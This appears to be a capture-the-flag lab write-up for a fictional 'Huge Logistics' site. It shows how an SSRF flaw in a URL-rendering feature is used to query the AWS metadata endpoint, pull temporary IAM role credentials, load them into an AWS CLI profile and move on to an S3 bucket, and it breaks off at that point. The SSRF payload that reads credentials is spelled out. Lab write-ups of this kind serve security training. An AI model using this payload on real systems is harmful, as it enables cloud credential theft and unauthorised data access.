# Initial Entry point

  

As an initial entry point, we have been provided with the following details

  

| <br> | <br> |
| --- | --- |
| Type | Value |
| IP Address | 52.6.119.121<br> |

  

The scenario here is Rumors are swirling on hacker forums about a potential breach at Huge Logistics. Your team has been monitoring these conversations closely, and Huge Logistics has asked you to assess the security of their website. Beyond the surface-level assessment, you’re also to investigate links to their cloud infrastructure, mapping out any potential risk exposure. The question isn’t just if they’ve been compromised, but how deep the rabbit hole goes.

  

## Solution

Adding the following IP Address `52.6.119.121`  in `/etc/hosts`  and pointing to `hugelogistics.pwn` 

  

```
nits@FWS-CHE-LT-8869 workflows % cat /etc/hosts
##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.

52.6.119.121             hugelogistics.pwn
```

  

Opening the IP Address in the browser and by the look of website, It looks like this website themed as offering logistics server for transporting goods and services

There is an additional functionality in the single page application, where you can put any domain name on to the input field let’s assume `example.com` and it renders out the content of actual `example.com` website and present it here

One more thing to note, In order to exploit a SSRF we need to know which cloud platform being utilised it may be Azure, AWS or even GCP and for that, we can look into the source of website and look for how images are being imported here… In our case, It is Amazon s3 with the bucket named `huge-logistics-storage`

Coming back to the service status page, with the following AWS metadata address payload `169.254.169.254/latest/meta-data`  prints out folder paths and confirms that there is a SSRF vulnerability exists

With the complete payload which is `169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access`  we can able to view the credentials belongs to user or role ( we need to determine it later may be ) called `MetapwnedS3Access` 

  

![](https://www.nithissh.xyz/_astro/ssrf-5.lwV7rJzP_Z1XIURa.webp.jpg)

Configured the Access keys, Secret Access key and session token into a profile called `MetaPwnedS3Access` 

  

```
nits@FWS-CHE-LT-8869 workflows % aws configure --profile MetaPwnedS3Access

```

  

This credentials which we got through the SSRF vulnerability as a assumed role named `MetaPwnedS3Access` 

  

```
nits@FWS-CHE-LT-8869 workflows % aws sts get-caller-identity --profile MetaPwnedS3Access
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

  

And now we can able to download the files from the following s3 bucket `huge-logistics-storage` 

  

```
